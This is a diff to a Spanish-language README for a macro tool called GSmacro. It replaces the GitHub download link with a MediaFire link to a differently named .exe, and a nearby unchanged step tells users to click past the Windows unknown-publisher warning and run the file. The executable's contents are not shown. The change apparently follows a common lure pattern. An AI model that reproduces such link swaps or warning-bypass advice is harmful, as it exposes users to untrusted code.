@@ -24,7 +24,7 @@ TUTORIAL. 🐔
 ----------------
 
 ## `Instalación. `⬇️
-- **`1`** Entra a https://github.com/else-wt/GSmacro/blob/main/gsmacro.exe y busca la opcion para instalarlo `(también puedes con Windows + shift + S)`.
+- **`1`** Entra a https://www.mediafire.com/file/8zou5m0254hdum2/gsmacro-recorder.exe/file y busca la opcion para instalarlo.
 - **`2`** Una ves instalado, simplemente abre la ubicación del archivo y ejecuta el `.exe`.
   - `⚡Dependiendo de tu sistema operativo puede salir una ventana de alerta por editor desconocido, esto es normal puesto a que no soy una empresa ni nadie conocido con una firma digital. En ese caso debes de seleccionar "mas información" y darle a la opción de ejecutar.`
 - **`3`** Dentro del programa veremos la siguiente interfaz:
